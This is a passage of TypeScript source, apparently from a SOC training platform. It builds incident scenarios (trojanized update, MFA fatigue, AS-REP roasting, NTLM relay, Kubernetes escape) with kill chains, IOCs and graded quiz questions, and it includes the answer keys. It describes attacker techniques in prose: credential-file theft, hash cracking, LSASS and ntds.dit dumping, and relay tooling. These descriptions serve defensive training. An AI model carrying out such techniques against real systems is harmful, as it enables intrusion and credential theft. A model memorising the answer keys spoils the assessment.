    { ts: T(8 * MIN),   phase: "C2",                action: "HTTPS beacon every 45s to api.telemetry-cdn.net — self-signed cert, domain 3 days old (T1071.001)" },
    { ts: T(10 * MIN),  phase: "Persistence",       action: "Cron job /etc/cron.d/netpulse-health — restarts malware every 15 min (T1053.003)" },
    { ts: T(13 * MIN),  phase: "Discovery",         action: "find scans /home /root /etc for credentials, .env, .pem files (T1083)" },
    { ts: T(18 * MIN),  phase: "Credential Access", action: "/root/.aws/credentials + SSH private key read from disk (T1552.001)" },
    { ts: T(22 * MIN),  phase: "Cloud Access",      action: "CloudTrail: AssumeRole from Singapore relay IP — first-ever use (T1078.004)" },
    { ts: T(25 * MIN),  phase: "Discovery",         action: "Rapid cloud recon: ListBuckets, DescribeInstances, ListSecrets — 90 seconds (T1580)" },
    { ts: T(28 * MIN),  phase: "Exfiltration",      action: "S3 GetObject on rocketstack-prod-backups — 2.3 GB in 847 API calls (T1530)" },
    { ts: T(32 * MIN),  phase: "Lateral Movement",  action: "SSH to db-primary.internal and jenkins.internal using stolen private key (T1021.004)" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "sc_q1", xp: 75,
      prompt: "Events evt_sc_01 (proxy download) and evt_sc_02 (installer) look completely legitimate. What single artifact in evt_sc_03 retroactively marks the update as malicious?",
      kind: "single",
      options: [
        { value: "path",    label: "The binary runs from /lib/x86_64-linux-gnu/, not /usr/lib/netpulse/ — wrong vendor install path, plus a SHA256 mismatch" },
        { value: "size",    label: "The package is 47.3 MB, roughly triple the size of the previous NetPulse point release recorded in the proxy log" },
        { value: "time",    label: "The installer ran at 14:32, outside the change-management window agreed with NetPulse for pushing agent updates" },
        { value: "tls",     label: "The TLS certificate presented by updates.netpulse.io was self-signed rather than issued by a public certificate authority" },
      ],
      answer: "path",
      explanation: "The binary runs from /lib/x86_64-linux-gnu/ — not where NetPulse installs (/usr/lib/netpulse/). Combined with the SHA256 hash mismatch vs. the vendor's published known-good hash, this proves the file was replaced. The TLS cert on updates.netpulse.io is legitimately issued by DigiCert — the vendor's update server itself was not compromised, only the package contents.",
    },
    {
      id: "sc_q2", xp: 50,
      prompt: "The C2 in evt_sc_04 uses HTTPS (port 443) to api.telemetry-cdn.net with a self-signed cert. Why does the firewall allow this traffic through?",
      kind: "single",
      options: [
        { value: "https",   label: "Port 443 HTTPS is allowed by default — without TLS inspection the firewall cannot check cert legitimacy or domain age" },
        { value: "vendor",  label: "The domain sits on the NetPulse vendor allowlist that the firewall administrator created during the original product deployment" },
        { value: "ip",      label: "The destination IP falls inside a CIDR range the firewall policy marks as trusted infrastructure, so no rule evaluates it" },
        { value: "geo",     label: "The Netherlands is not on the geo-blocking list, and the firewall only drops sessions to sanctioned or high-risk countries" },
      ],
      answer: "https",
      explanation: "Without TLS inspection (SSL decryption proxy), the firewall sees 'HTTPS to port 443 — allow'. The self-signed cert and 3-day domain age are inside the TLS handshake, invisible to the firewall. This is why C2 over port 443 is so effective: it blends with legitimate HTTPS. Defenders need: TLS inspection for outbound traffic, DNS filtering with domain age checks, and proxy-level blocking of self-signed certs for non-trusted categories.",
    },
    {
      id: "sc_q3", xp: 75,
      prompt: "The CloudTrail AssumeRole (evt_sc_08) comes from Singapore IP 18.141.220.50 — not from the C2 IP 185.193.127.88 (Netherlands). What does this tell an analyst?",
      kind: "single",
      options: [
        { value: "relay",   label: "The attacker split infrastructure — C2 via the Netherlands, cloud API calls via a Singapore relay — to separate attribution" },
        { value: "second",  label: "A second, independent threat actor is attacking the cloud environment at the same time from its own, entirely separate infrastructure" },
        { value: "fp",      label: "A false positive — a remote developer legitimately using the devops-ci CI/CD credentials while travelling in Singapore" },
        { value: "sink",    label: "The C2 domain was sinkholed mid-incident, forcing the attacker to move operations onto a new Singapore IP address" },
      ],
      answer: "relay",
      explanation: "Sophisticated actors separate infrastructure by function: endpoint C2 uses one set of IPs; cloud API calls use different relay servers. This defeats simple IP-based correlation. The pivot point that connects them is the credential theft in evt_sc_07 — credentials stolen from prod-srv-01 (which was talking to the Netherlands C2) then appear in AWS CloudTrail from Singapore. Trace credentials, not just IPs.",
    },
    {
      id: "sc_q4", xp: 100,
      prompt: "Which TWO actions must happen immediately (within minutes) after confirming this supply chain compromise?",
      kind: "multi",
      options: [
        { value: "revoke",   label: "Revoke the stolen AWS IAM credentials for user devops-ci — stops cloud exfiltration and lateral cloud movement" },
        { value: "isolate",  label: "Network-isolate prod-srv-01 via EDR — cuts C2 beacon and blocks SSH lateral movement to db-primary and jenkins" },
        { value: "notify",   label: "Notify the NetPulse vendor about the compromised update package" },
        { value: "submit",   label: "Submit the malicious shared-object hash to VirusTotal for community threat sharing" },
      ],
      answer: ["revoke", "isolate"],
      explanation: "IAM credential revocation immediately stops all S3 exfiltration and further cloud discovery. EDR network isolation severs the C2 channel and prevents further SSH lateral movement to the database and CI/CD systems. Vendor notification and VirusTotal submission are important but are not immediate containment actions — they can wait 30 minutes while the active threat is stopped.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "APT-SHADOWSUPPLY (nation-state supply chain operator)",
    attack_kind: "supply_chain",
    briefing: "CrowdStrike raised a detection on prod-srv-01 at 14:35. The host completed a scheduled NetPulse agent auto-update earlier that afternoon under an approved change record. The firewall shows repeated outbound HTTPS from this server since. Confirm whether the two are related.",
    narrative: `On a Tuesday afternoon, RocketStack's production server ran a routine auto-update for the NetPulse infrastructure monitoring agent. The download came from the real vendor CDN, the installer carried an authentic NetPulse code-signing certificate, and the update was in the change management calendar. What no one at RocketStack knew was that APT-SHADOWSUPPLY — a nation-state group specializing in software supply chain attacks — had compromised NetPulse Solutions' build pipeline three days earlier and embedded a malicious shared object (libnetpulse_core.so.2) inside the v4.2.2 package. Within 5 minutes of installation the malware spawned a child process from an unexpected path, established a C2 beacon to a 3-day-old domain masquerading as vendor telemetry, and wrote a cron job for persistence. Over the following 20 minutes it systematically hunted for credentials, read AWS access keys from /root/.aws/credentials, and began enumerating RocketStack's entire cloud infrastructure. The final blow: 2.3 GB of production database backups and customer PII exfiltrated via 847 S3 API calls — sourced through a Singapore relay that initially appeared unrelated to the C2. Your job: identify the supply chain indicator that exposes the trojanized update, trace the attacker's proxy chain across log sources, and define the two immediate containment actions.`,
    learning_objectives: [
      "Understand why supply chain attacks bypass traditional controls: the initial download is legitimate and signed by a trusted vendor certificate",
      "Identify supply chain compromise indicators: wrong binary installation path, SHA256 hash mismatch vs. vendor known-good, unexpected child process from vendor parent",
      "Recognize C2-over-HTTPS evasion: self-signed certificate plus new domain registration visible only with TLS inspection at the proxy",
      "Correlate on-premise credential theft with subsequent cloud API activity from a different IP (proxy chain attribution)",
      "Define immediate containment priority: IAM credential revocation to stop cloud damage, EDR isolation to cut C2 and lateral movement",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

// ─── MFA Fatigue → Okta Account Takeover (⭐ Easy) ───────────────────────────

export function buildMfaFatigueScenario(scenarioId = "mfa-fatigue-ato"): ScenarioBundle {
  const { title, events, T, MIN } = mfaFatigueScenarioEvents();

  const iocs: IOC[] = [
    { type: "ip",     value: "91.108.4.33",                            reputation: "malicious", tags: ["external-infrastructure", "moscow", "telegram-datacenter"] },
    { type: "email",  value: "j.chen.backup@proton.me",                reputation: "malicious", tags: ["exfil-target", "inbox-forwarding"] },
    { type: "host",   value: "DESKTOP-MOSCOW-99",                      reputation: "malicious", tags: ["attacker-device", "ca-policy-exclusion"] },
    // The persistence artifact is an Okta API token, identified in the Okta System
    // Log by its NAME, not a file hash — Okta never emits a SHA256 for a token.
    // (Was previously a fabricated makeSha256() value that appeared nowhere in the
    // telemetry: an uncitable curated IOC that permanently capped the achievable
    // evidence score below 100%, since a student can never find a hash the vendor
    // never generates. Fixed to the actual token name from mfa_08_api_token's raw
    // block, which the analyst can genuinely read and cite.)
    { type: "user",   value: "j.chen-api-token-2026",                    reputation: "malicious", tags: ["okta-api-token", "persistence"] },
  ];

  const killchain = [
    { ts: T(0),                  phase: "Credential Access", action: "Password spray — 47 failures for j.chen from 91.108.4.33 (Moscow) using python-requests" },
    { ts: T(1 * MIN + 17_000),   phase: "Initial Access",    action: "First-factor auth success — MFA push bombardment begins" },
    { ts: T(6 * MIN + 17_000),   phase: "Credential Access", action: "MFA fatigue in progress — j.chen rejects 12 push notifications over 5 minutes" },
    { ts: T(12 * MIN + 17_000),  phase: "Initial Access",    action: "j.chen approves MFA push at 01:32:17 AM after 60 total notifications — account compromised" },
    { ts: T(12 * MIN + 44_000),  phase: "Persistence",       action: "Device 'DESKTOP-MOSCOW-99' enrolled to Okta 27 seconds after MFA approval" },
    { ts: T(14 * MIN),           phase: "Collection",        action: "3,847 mailbox items accessed via Microsoft Graph API MailItemsAccessed" },
    { ts: T(16 * MIN),           phase: "Exfiltration",      action: "847 SharePoint files (2.3 GB) bulk-downloaded in 4 minutes — far above j.chen's daily baseline" },
    { ts: T(20 * MIN),           phase: "Persistence",       action: "Okta API token 'j.chen-api-token-2026' created with no expiry" },
    { ts: T(22 * MIN),           phase: "Defense Evasion",   action: "Conditional Access policy modified to permanently whitelist DESKTOP-MOSCOW-99" },
    { ts: T(24 * MIN),           phase: "Persistence",       action: "Exchange inbox forwarding rule created — all email forwarded to j.chen.backup@proton.me" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1", xp: 20,
      prompt: "What is the first clear indicator this is MFA fatigue and not a user accidentally rejecting legitimate pushes?",
      kind: "single",
      options: [
        { value: "a", label: "The 47 failed authentications far exceed the baseline of three failures per user per day that Okta reports for this tenant" },
        { value: "b", label: "The approval was recorded at 01:32 AM, well outside j.chen's normal 08:00-18:00 pattern in the Okta sign-in log" },
        { value: "c", label: "60 push notifications were sent in 11 minutes from a Russian IP after the user rejected 12 — deliberate bombardment" },
        { value: "d", label: "A new Okta Verify device, DESKTOP-MOSCOW-99, was enrolled minutes after the approval, giving the attacker a factor" },
      ],
      answer: "c",
      explanation: "The combination of source IP (Russia), 12 rejections ignored, continued bombardment (48 more pushes), and 01:32 AM approval are textbook MFA fatigue. The python-requests User-Agent in event 1 confirms this is scripted, not a legitimate user.",
    },
    {
      id: "q2", xp: 20,
      prompt: "The attacker modified a Conditional Access policy (mfa_09_ca_policy). Why is this particularly dangerous?",
      kind: "single",
      options: [
        { value: "a", label: "It switches off the MFA requirement tenant-wide, so every user in the organization can now sign in with a password alone" },
        { value: "b", label: "Their unmanaged device becomes exempt from the compliance requirement, so it keeps access despite never being Intune-compliant" },
        { value: "c", label: "It strips the sign-in log data from Entra ID, so the SOC loses the audit trail it needs to investigate the account takeover" },
        { value: "d", label: "It elevates the compromised account to Global Administrator, giving the attacker full control of every Entra ID object in the tenant" },
      ],
      answer: "b",
      explanation: "Read what the policy actually grants. 'Require Compliant Device' is a DEVICE-COMPLIANCE control, not an MFA control — the two are separate grant controls and usually live in separate policies. Excluding DESKTOP-MOSCOW-99 from it does not switch MFA off, and no Conditional Access exclusion lets anyone in without a password. What it does is exempt an unmanaged attacker-controlled machine from the one control that would otherwise have kept it out permanently, because that device is never going to become Intune-compliant. The persistence is real and it is the right answer — it just works through the compliance gate rather than the MFA gate. This distinction matters in practice: an analyst who reports 'MFA was disabled' sends the response team after the wrong control.",
    },
    {
      id: "q3", xp: 15,
      prompt: "Which investigation step definitively rules out a FP for event mfa_01 (47 auth failures)?",
      kind: "single",
      options: [
        { value: "a", label: "Check the User-Agent — 'python-requests/2.31.0' is a scripted tool, not a browser or Okta Verify app" },
        { value: "b", label: "Check the HR system for whether j.chen was on approved PTO and therefore could not have been signing in" },
        { value: "c", label: "Check whether Okta locked the account after the failure threshold, since a lockout confirms the attempts were real" },
        { value: "d", label: "Call j.chen and ask whether she was trying to sign in, then close the alert based on her recollection" },
      ],
      answer: "a",
      explanation: "The User-Agent 'python-requests/2.31.0' is the smoking gun — this is a Python script, not a user's browser or mobile app. Legitimate users never generate auth failures with Python requests. Combined with the Russian source IP, this immediately rules out a legitimate user lockout.",
    },
    {
      id: "q4", xp: 25,
      prompt: "In what order should you contain this incident?",
      kind: "single",
      options: [
        { value: "a", label: "Reset password first → Revoke active sessions → Notify user by email → Remove inbox forwarding rule → Remove enrolled device → Revoke API token" },
        { value: "b", label: "Notify user by email → Reset password → Remove enrolled device → Remove inbox forwarding rule → Revoke active sessions → Revoke API token" },
        { value: "c", label: "Remove inbox forwarding rule → Revoke API token → Reset password → Remove enrolled device → Notify the CISO → Revoke active sessions" },
        { value: "d", label: "Revoke all active sessions → Remove inbox forwarding rule → Revoke API token → Reset password → Remove enrolled device → Notify user by phone" },
      ],
      answer: "d",
      explanation: "Order matters critically: (1) Revoke sessions first — stops live access. (2) Remove forwarding rule — stops ongoing email theft to ProtonMail. (3) Revoke API token — removes persistence that survives password reset. (4) Reset password. (5) Remove device. Notify via phone because the attacker is reading her email.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "UNC3944",
    attack_kind: "Identity Attack / Account Takeover",
    briefing: "Okta flagged a burst of 47 failed authentications on j.chen's account from a foreign address at 01:20, then repeated MFA prompts and a successful login by 01:32. A new device is now enrolled on the account. j.chen has not been reached.",
    narrative: "UNC3944 obtained j.chen's password from a credential marketplace. After covering their tracks with 47 noisy spray attempts, they authenticated and bypassed MFA by bombarding Jennifer Chen's phone with 60 push notifications over 11 minutes until she approved at 01:32 AM — fatigue-induced mistake. Within 2 minutes the attacker enrolled a new device from Moscow, collected her entire mailbox via Graph API, bulk-downloaded 847 SharePoint files, and established persistence via a new API token and a Conditional Access policy exclusion for their device.",
    learning_objectives: [
      "Recognize MFA push bombardment pattern (volume + timing anomaly)",
      "Understand that push approval at unusual hours from foreign IP is a key indicator",
      "Identify post-compromise Graph API activity as attacker-controlled access",
      "Know the correct incident response order: sessions → forwarding rules → API tokens → password reset",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

// ─── AS-REP Roasting → Offline Hash Crack (⭐⭐ Intermediate) ────────────────

export function buildAsRepRoastingScenario(scenarioId = "asrep-roasting"): ScenarioBundle {
  const { title, events, T, MIN, HOUR } = asRepRoastingScenarioEvents();

  const iocs: IOC[] = [
    { type: "host",   value: "WS-DEV-09",                               reputation: "clean", tags: ["internal-host", "ip:10.0.1.45"] },
    { type: "ip",     value: "10.0.1.45",                               reputation: "malicious", tags: ["ws-dev-09"] },
  ];

  const killchain = [
    { ts: T(-25 * MIN),            phase: "Initial Access",    action: "m.johnson's interactive session on WS-DEV-09 — the foothold every later workstation row runs under" },
    { ts: T(-5_000),               phase: "Credential Access", action: "Impacket GetNPUsers.py launched on WS-DEV-09 under m.johnson (EDR process telemetry)" },
    { ts: T(2 * MIN),              phase: "Credential Access", action: "AS-REP TGT requested for svc-backup without credentials (PreAuthType=0, RC4 encryption)" },
    { ts: T(2 * MIN + 30_000),     phase: "Credential Access", action: "AS-REP TGTs collected for svc-monitoring and svc-reports — 3 offline-crackable hashes captured" },
    { ts: T(3 * MIN + 10_000),     phase: "Detection",         action: "Defender for Identity raises 'Suspected AS-REP Roasting attack' — source WS-DEV-09, three target accounts" },
    { ts: T(3 * MIN),              phase: "Offline Cracking",  action: "Silent gap — hashcat cracking RC4-encrypted TGTs offline (no domain logs generated)" },
    { ts: T(6 * HOUR),             phase: "Lateral Movement",  action: "svc-backup authenticates from WS-DEV-09 to SRV-FILE01 — crack succeeded" },
    { ts: T(6 * HOUR + 1 * MIN),   phase: "Privilege Abuse",   action: "SeBackupPrivilege assigned to svc-backup session — file ACL bypass established" },
    { ts: T(6 * HOUR + 5 * MIN),   phase: "Discovery",         action: "net.exe enumerates Domain Admins group — attacker mapping escalation path" },
    { ts: T(6 * HOUR + 20 * MIN),  phase: "Credential Access", action: "ntdsutil.exe writes an IFM copy of ntds.dit to C:\\Temp\\ntds_dump on DC01 — every domain account's hash is now exposed" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1", xp: 20,
      prompt: "Events 2, 3, and 4 all show Kerberos Event 4768. What single field makes these events malicious?",
      kind: "single",
      options: [
        { value: "a", label: "TicketEncryptionType is 0x17 (RC4-HMAC) rather than 0x12 (AES256), and that downgrade is what makes the returned ticket crackable" },
        { value: "b", label: "PreAuthType=0 means the account does not require pre-authentication — the attacker got the TGT without providing any credentials" },
        { value: "c", label: "All three requests share the same IpAddress value, showing one host enumerated tickets for three different accounts in sequence" },
        { value: "d", label: "The ServiceName is krbtgt, and a TGT request naming the krbtgt service is the signature of a forged Golden Ticket being presented" },
      ],
      answer: "b",
      explanation: "PreAuthType=0 is the smoking gun. Normal Kerberos auth requires the client to prove identity with an encrypted timestamp. Accounts with pre-auth disabled hand out AS-REP responses to anyone who asks — no credentials needed. The attacker takes the RC4-encrypted TGT and cracks it offline.",
    },
    {
      id: "q2", xp: 20,
      prompt: "There is a 6-hour gap between Events 2-4 (the AS-REP requests) and Events 7-10 (lateral movement). What does this gap indicate?",
      kind: "single",
      options: [
        { value: "a", label: "The attacker was waiting out the account lockout window before retrying authentication against the domain controller" },
        { value: "b", label: "The attacker was staging additional tooling on the host, downloading PsExec and credential dumpers before moving laterally" },
        { value: "c", label: "Offline hash cracking — the gap between capturing the AS-REP hash and cracking it with a wordlist (e.g., hashcat)" },
        { value: "d", label: "The activity paused because the attacker operates on a different time zone and resumed at the start of their working hours" },
      ],
      answer: "c",
      explanation: "AS-REP Roasting produces an offline-crackable hash. The 6-hour gap is the cracking time. Hashcat on a GPU can crack weak service account passwords in minutes to hours. The sudden appearance of svc-backup authenticating from WS-DEV-09 (the attacker machine) confirms the crack succeeded.",
    },
    {
      id: "q3", xp: 15,
      prompt: "Event 8 shows svc-backup receiving SeBackupPrivilege. Why is this dangerous even without Domain Admin rights?",
      kind: "single",
      options: [
        { value: "a", label: "SeBackupPrivilege allows reading any file regardless of ACLs — including ntds.dit, which contains NTLM hashes for all domain accounts" },
        { value: "b", label: "SeBackupPrivilege lets the holder register scheduled tasks that run as SYSTEM, giving code execution on the domain controller at every boot" },
        { value: "c", label: "SeBackupPrivilege adds the account to the Remote Desktop Users group, allowing an interactive session on any domain controller" },
        { value: "d", label: "SeBackupPrivilege lets the account stop the Windows Defender service and clear its exclusion list, blinding detection on the host" },
      ],
      answer: "a",
      explanation: "SeBackupPrivilege bypasses file ACLs for backup purposes, and combined with ntdsutil it allows a copy of NTDS.dit — the AD database holding an NTLM hash for every domain account. The detail that matters is WHERE the privilege is held. The grant on SRV-FILE01 gave the attacker nothing on the domain controller; what made the dump possible is that svc-backup was a member of Backup Operators ON DC01 and had been since 2023, which is visible in the logon that precedes the dump. That standing entitlement is the finding for the report: the account did not need to be escalated, it was already over-privileged, and no amount of password rotation fixes that.",
    },
    {
      id: "q4", xp: 25,
      prompt: "What is the correct immediate remediation for this attack?",
      kind: "single",
      options: [
        { value: "a", label: "Reset svc-backup's password to a 25-character random value, migrate it to a Group Managed Service Account, and monitor Event ID 4768 for further TGT requests" },
        { value: "b", label: "Network-contain WS-DEV-09 with the EDR isolation action, reimage the host from a clean image, and block the attacker's outbound IP at the perimeter firewall" },
        { value: "c", label: "Enable Kerberos pre-authentication on the three accounts by clearing the DONT_REQ_PREAUTH bit in userAccountControl, then apply a fine-grained password policy" },
        { value: "d", label: "Enable pre-authentication on all three accounts AND treat the whole domain as compromised — reset all passwords, including krbtgt twice (NTDS.dit was read)" },
      ],
      answer: "d",
      explanation: "Since ntdsutil accessed NTDS.dit (Event 10), all domain credentials are compromised. Response must include: (1) Enable pre-auth on affected accounts. (2) Reset all domain account passwords. (3) Reset krbtgt password TWICE (golden ticket prevention). (4) Force-expire all active Kerberos tickets.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "APT28 (Fancy Bear)",
    attack_kind: "Credential Access / Lateral Movement",
    briefing: "Defender for Identity raised 'Suspected AS-REP Roasting attack' at 09:03 with WS-DEV-09 (10.0.1.45) as the source and three service accounts as targets. DC01's Kerberos log, Zeek and the EDR on WS-DEV-09 are available for the same window.",
    narrative: "APT28 operator with foothold on developer workstation WS-DEV-09 discovers three NexaCorp service accounts with Kerberos pre-authentication disabled. Using Impacket GetNPUsers.py, they request AS-REP responses (TGTs) without providing credentials. The RC4-encrypted TGT hashes are cracked offline (silent period — no logs). Six hours later the cracked svc-backup password is used to authenticate laterally. The account turns out to hold Backup Operators rights on the domain controller itself, and ntdsutil is used there to create an IFM snapshot containing the AD database.",
    learning_objectives: [
      "Understand that Kerberos Event 4768 with PreAuthType=0 means the account is vulnerable to AS-REP Roasting",
      "Recognize Impacket tooling signatures in EDR logs",
      "Understand why a 6-hour gap between roasting and lateral movement indicates offline cracking",
      "Know that SeBackupPrivilege enables NTDS.dit access without Domain Admin rights",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

// ─── NTLM Relay — Internal Credential Hijacking (⭐⭐⭐ Advanced) ────────────

export function buildNtlmRelayScenario(scenarioId = "ntlm-relay-responder"): ScenarioBundle {
  const { title, events, T, MIN } = ntlmRelayScenarioEvents();

  const iocs: IOC[] = [
    { type: "ip",     value: "10.0.1.45",                                 reputation: "malicious", tags: ["ws-dev-09"] },
    { type: "sha256", value: makeSha256("inveigh_exe_llmnr_poisoner"), reputation: "malicious", tags: ["poisoning-tool", "workstation"] },
    { type: "sha256", value: makeSha256("PSEXESVC-ntlm-relay-2026"),     reputation: "malicious", tags: ["psexec", "lateral-movement", "remote-exec"] },
    { type: "host",   value: "WS-DEV-09",                                 reputation: "clean", tags: ["internal-host"] },
  ];

  const killchain = [
    { ts: T(-40 * MIN),   phase: "Initial Access",    action: "m.johnson's interactive session on WS-DEV-09 — the foothold the poisoner runs under" },
    { ts: T(-10_000),     phase: "Credential Access", action: "Inveigh.exe starts on WS-DEV-09 with LLMNR, NBNS and SMB listeners" },
    { ts: T(-6_000),      phase: "Detection",         action: "EDR raises a critical, detect-only alert on Inveigh.exe — the process keeps running" },
    { ts: T(0),           phase: "Collection",        action: "WS-FIN-03 broadcasts an LLMNR query for a name DNS could not resolve — the poisoner answers it" },
    { ts: T(1_000),       phase: "Credential Access", action: "Inveigh on WS-DEV-09 answers the broadcast, redirecting WS-FIN-03 to the attacker host" },
    { ts: T(5_000),       phase: "Credential Access", action: "l.nguyen's NTLM challenge-response captured and relayed to SRV-FILE01" },
    { ts: T(8_000),       phase: "Lateral Movement",  action: "Relay succeeds — l.nguyen authenticated to SRV-FILE01 from attacker IP 10.0.1.45" },
    { ts: T(15 * MIN),    phase: "Execution",         action: "PSEXESVC.exe deployed via relayed credentials — remote SYSTEM execution on SRV-FILE01" },
    { ts: T(16 * MIN),    phase: "Discovery",         action: "net user /domain enumerates all domain accounts from SYSTEM context" },
    { ts: T(18 * MIN),    phase: "Credential Access", action: "LSASS dumped with PROCESS_ALL_ACCESS (0x1FFFFF) — server credentials harvested" },
    { ts: T(25 * MIN),    phase: "Lateral Movement",  action: "SMB connections to 3 additional internal servers using credentials from LSASS dump" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1", xp: 25,
      prompt: "Which single event, on its own and without correlating it against anything else, confirms an NTLM relay is under way?",
      kind: "single",
      options: [
        { value: "a", label: "Event 1 — WS-FIN-03 broadcasting an LLMNR query for a share name that its DNS server could not resolve" },
        { value: "b", label: "Event 3 — WS-FIN-03 opening an SMB session to another workstation rather than to a departmental file server" },
        { value: "c", label: "Event 4 — an LLMNR/NBNS poisoning tool running on WS-DEV-09 with its listener flags in the command line" },
        { value: "d", label: "Event 5 — l.nguyen successfully authenticating to SRV-FILE01 over NTLM with a type-3 network logon" },
      ],
      answer: "c",
      explanation: "Event 4 is the only unambiguous one. An LLMNR broadcast is ordinary Windows behaviour whenever DNS misses, and workstation-to-workstation SMB is unusual without being proof of anything. Event 5 is genuinely damning once you read WorkstationName against IpAddress — but that takes a comparison, whereas a process whose command line enables LLMNR, NBNS and SMB listeners has no legitimate purpose on a corporate endpoint and needs no correlation to interpret. It is also the earliest point at which containment would still have prevented the relay.",
    },
    {
      id: "q2", xp: 20,
      prompt: "Event 5 is a successful 4624 for l.nguyen on SRV-FILE01. Reading only that one record, what marks it as a relayed authentication?",
      kind: "single",
      options: [
        { value: "a", label: "l.nguyen holds no group membership in the SRV-FILE01 share ACL, so a successful logon recorded for that account cannot be genuine" },
        { value: "b", label: "WorkstationName says WS-FIN-03 but the connection came from 10.0.1.45 — the machine naming itself is not the one that connected" },
        { value: "c", label: "The logon negotiated NTLM rather than Kerberos, and NTLM against a domain-joined file server is sufficient proof of a relay on its own" },
        { value: "d", label: "The LogonType is 3 (network) rather than 2 (interactive), which is unexpected for a user reaching a file server holding departmental shares" },
      ],
      answer: "b",
      explanation: "One record contradicts itself, and that is the whole finding. The relaying tool forwards the victim's NTLMSSP_AUTH message byte for byte — it cannot rewrite the workstation name inside it without invalidating the message integrity code and breaking the authentication it is trying to complete. So the name travels with the stolen blob (WS-FIN-03, the victim) while the packet is emitted by the attacker's host (10.0.1.45). Those two fields describing different machines in a single 4624 is the highest-fidelity relay indicator there is, and it needs no asset inventory to spot — the record impeaches itself. Option (c) is the common overreach: NTLM to a file server is extremely ordinary, and treating it as proof would bury a SOC in false positives. Option (d) is simply what a file share looks like — LogonType 3 is the normal case there. Option (a) inverts how authentication and authorisation relate: the 4624 records that the credential was accepted, and share permissions are evaluated afterwards.",
    },
    {
      id: "q3", xp: 15,
      prompt: "What is the root cause that allowed this NTLM relay attack to succeed?",
      kind: "single",
      options: [
        { value: "a", label: "l.nguyen was over-privileged — a standard user should not hold write access to SRV-FILE01" },
        { value: "b", label: "LLMNR/NBT-NS was enabled on the network AND SMB signing was not required on SRV-FILE01" },
        { value: "c", label: "The attacker had physical access to WS-DEV-09 and plugged a rogue device into the switch" },
        { value: "d", label: "Windows Defender real-time protection was disabled on WS-FIN-03, so the tool ran unblocked" },
      ],
      answer: "b",
      explanation: "Two conditions had to hold at once. LLMNR/NBT-NS being enabled is what let the attacker answer a name lookup they had no right to answer — that is the poisoning step. SMB signing not being required on SRV-FILE01 is what let the stolen authentication be accepted from a machine that did not originate it. Signing does not DETECT a relay; it PREVENTS one, and the mechanism matters: signing binds the session to a key derived during authentication, and the relaying attacker never possesses that key because they only forward the victim's messages without ever learning the secret behind them. The same fact explains something worth putting in the report: changing l.nguyen's password does not help here, because the attacker never learned her password or her hash — they borrowed a live authentication and spent it. Remediation is disabling LLMNR and NBT-NS by GPO and requiring SMB signing on servers, and neither is a detection control.",
    },
    {
      id: "q4", xp: 20,
      prompt: "Which detection approach would have caught the poisoning tool in Event 4 before the relay succeeded?",
      kind: "single",
      options: [
        { value: "a", label: "Monitoring all UDP 5355 LLMNR broadcast traffic on the workstation VLAN and alerting on any spike in name-resolution volume from one host" },
        { value: "b", label: "EDR process detection — the binary is known, and a command line enabling LLMNR, NBNS and SMB listeners has no legitimate use on an endpoint" },
        { value: "c", label: "Configuring a firewall rule that denies inbound TCP 445 to SRV-FILE01 from every workstation subnet, so an SMB relay cannot reach it" },
        { value: "d", label: "Alerting on every NTLM authentication failure recorded as Event ID 4625 on member servers, and treating each one as a possible relay attempt" },
      ],
      answer: "b",
      explanation: "EDR catches the tool before a single credential is captured, which is the only point at which this is still preventable rather than merely detectable. Monitoring LLMNR broadcast volume fails because broadcasts are constant baseline noise on any Windows network and the poisoner adds almost none of it — the attacker ANSWERS traffic rather than generating it. Denying inbound 445 from workstation subnets is a prevention control rather than a detection, and it would break ordinary file sharing while doing nothing about a relay that stays inside one VLAN. Alerting on every 4625 buries the SOC in noise and, in this scenario, would have found nothing at all: a relay produces no failed logon on the poisoning host.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "FIN7 (compromised internal machine)",
    attack_kind: "Credential Access / Lateral Movement",
    briefing: "FortiGate flagged LLMNR broadcast traffic on the finance VLAN at 10:12 and CrowdStrike raised a tooling detection on WS-DEV-09. Separately, SRV-FILE01 recorded a service installation and a network logon for l.nguyen. All three are on one ticket.",
    narrative: "An operator with a foothold on developer workstation WS-DEV-09 runs Inveigh to answer LLMNR broadcasts. When finance analyst l.nguyen's machine (WS-FIN-03) looks up a share name DNS cannot resolve, the poisoner answers and presents itself as the target. WS-FIN-03 sends its NTLM authentication — which is relayed onward to SRV-FILE01, arriving from the attacker's address while still carrying the victim's workstation name inside it. The attacker then deploys PSEXESVC for SYSTEM execution, dumps LSASS credentials, and pivots to three additional internal servers. No external C2, no malware dropped on WS-FIN-03 — just internal auth relay.",
    learning_objectives: [
      "Correlate three low-fidelity events (LLMNR broadcast, LLMNR response, workstation-to-workstation SMB session) into a single attack chain",
      "Identify that relay auth source IP differs from the victim's actual workstation IP",
      "Understand that LLMNR disable + SMB signing are the dual prerequisites for relay prevention",
      "Recognise an LLMNR/NBNS poisoning tool from its listener flags in EDR command lines",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

// ─── Kubernetes Pod Escape → Cloud Metadata Theft (⭐⭐⭐ Advanced) ──────────

export function buildK8sPodEscapeScenario(scenarioId = "k8s-pod-escape-imds"): ScenarioBundle {
  const { title, events, T, MIN } = k8sPodEscapeScenarioEvents();

  const iocs: IOC[] = [
    { type: "ip",     value: "193.233.48.71", reputation: "malicious", tags: ["tor-exit-node", "attacker-source", "imds-query-origin", "cloudtrail-source"] },
    { type: "user",   value: "svc-monitoring-backup", reputation: "malicious", tags: ["iam-principal", "administrator-access", "persistence"] },
    // Were two `sha256` IOCs seeded from strings like
    // "eks-node-role-credentials-stolen". Neither appeared in any event, and
    // neither could: IAM credentials and an S3 object fetched via GetObject
    // produce no file hash in this telemetry. Replaced with indicators the
    // analyst can actually pivot on.
